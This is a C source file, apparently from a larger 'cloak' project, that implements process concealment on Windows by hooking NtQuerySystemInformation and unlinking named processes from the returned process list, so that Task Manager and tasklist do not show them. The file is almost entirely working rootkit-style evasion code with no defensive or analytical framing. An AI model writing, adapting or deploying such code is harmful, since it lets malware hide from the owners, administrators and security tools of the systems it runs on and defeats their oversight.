/*
 * hide_process.c — Process Concealment via NtQuerySystemInformation Hook
 * 22DIV / george wu
 *
 * Hooks NtQuerySystemInformation. When SystemProcessInformation (class 5)
 * is queried, walks the SYSTEM_PROCESS_INFORMATION linked list and unlinks
 * entries matching hidden process names. Task Manager, tasklist.exe, and
 * any tool using this API will not see the hidden processes.
 */

#include <windows.h>
#include <winternl.h>
#include "hook_engine.h"
#include "cloak.h"

#define SystemProcessInformation 5

typedef struct _SYSTEM_PROCESS_INFO {
    ULONG           NextEntryOffset;
    ULONG           NumberOfThreads;
    LARGE_INTEGER   WorkingSetPrivateSize;
    ULONG           HardFaultCount;
    ULONG           NumberOfThreadsHighWatermark;
    ULONGLONG       CycleTime;
    LARGE_INTEGER   CreateTime;
    LARGE_INTEGER   UserTime;
    LARGE_INTEGER   KernelTime;
    UNICODE_STRING  ImageName;
    LONG            BasePriority;
    HANDLE          UniqueProcessId;
    HANDLE          InheritedFromUniqueProcessId;
    ULONG           HandleCount;
    ULONG           SessionId;
    ULONG_PTR       UniqueProcessKey;
    SIZE_T          PeakVirtualSize;
    SIZE_T          VirtualSize;
    ULONG           PageFaultCount;
    SIZE_T          PeakWorkingSetSize;
    SIZE_T          WorkingSetSize;
    SIZE_T          QuotaPeakPagedPoolUsage;
    SIZE_T          QuotaPagedPoolUsage;
    SIZE_T          QuotaPeakNonPagedPoolUsage;
    SIZE_T          QuotaNonPagedPoolUsage;
    SIZE_T          PagefileUsage;
    SIZE_T          PeakPagefileUsage;
    SIZE_T          PrivatePageCount;
    LARGE_INTEGER   ReadOperationCount;
    LARGE_INTEGER   WriteOperationCount;
    LARGE_INTEGER   OtherOperationCount;
    LARGE_INTEGER   ReadTransferCount;
    LARGE_INTEGER   WriteTransferCount;
    LARGE_INTEGER   OtherTransferCount;
} SYSTEM_PROCESS_INFO;

typedef NTSTATUS (NTAPI *pfnNtQuerySystemInformation)(
    ULONG  SystemInformationClass,
    PVOID  SystemInformation,
    ULONG  SystemInformationLength,
    PULONG ReturnLength
);

HOOK_ENTRY g_hook_nqsi = {0};

static BOOL should_hide_process(UNICODE_STRING *name) {
    if (!name || !name->Buffer || name->Length == 0)
        return FALSE;
    ULONG charLen = name->Length / sizeof(WCHAR);
    return match_hidden_name(name->Buffer, charLen, HIDDEN_PROCESSES);
}

static NTSTATUS NTAPI hook_NtQuerySystemInformation(
    ULONG  SystemInformationClass,
    PVOID  SystemInformation,
    ULONG  SystemInformationLength,
    PULONG ReturnLength
) {
    pfnNtQuerySystemInformation orig =
        (pfnNtQuerySystemInformation)g_hook_nqsi.trampoline;

    NTSTATUS status = orig(
        SystemInformationClass, SystemInformation,
        SystemInformationLength, ReturnLength
    );

    if (status != 0 || SystemInformationClass != SystemProcessInformation)
        return status;

    ULONG dataSize = (ReturnLength && *ReturnLength) ?
        *ReturnLength : SystemInformationLength;

    SYSTEM_PROCESS_INFO *prev = NULL;
    SYSTEM_PROCESS_INFO *curr = (SYSTEM_PROCESS_INFO *)SystemInformation;

    for (;;) {
        BOOL hide = should_hide_process(&curr->ImageName);

        if (hide) {
            if (curr->NextEntryOffset == 0) {
                if (prev)
                    prev->NextEntryOffset = 0;
                break;
            }

            if (prev) {
                prev->NextEntryOffset += curr->NextEntryOffset;
            } else {
                ULONG shift = curr->NextEntryOffset;
                ULONG offset = (ULONG)((BYTE *)curr - (BYTE *)SystemInformation);
                ULONG remaining = dataSize - offset - shift;
                memmove(curr, (BYTE *)curr + shift, remaining);
                if (ReturnLength) *ReturnLength -= shift;
                dataSize -= shift;
                continue;
            }
        } else {
            prev = curr;
        }

        if (curr->NextEntryOffset == 0)
            break;
        curr = (SYSTEM_PROCESS_INFO *)((BYTE *)curr + curr->NextEntryOffset);
    }

    return status;
}

BOOL install_process_hook(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return FALSE;

    g_hook_nqsi.target         = GetProcAddress(ntdll, "NtQuerySystemInformation");
    g_hook_nqsi.hook           = hook_NtQuerySystemInformation;
    g_hook_nqsi.save_size      = 24;   /* full NT stub incl. syscall+ret */
    g_hook_nqsi.self_contained = TRUE;

    if (!g_hook_nqsi.target) return FALSE;
    return hook_install(&g_hook_nqsi);
}

void remove_process_hook(void) {
    hook_remove(&g_hook_nqsi);
}
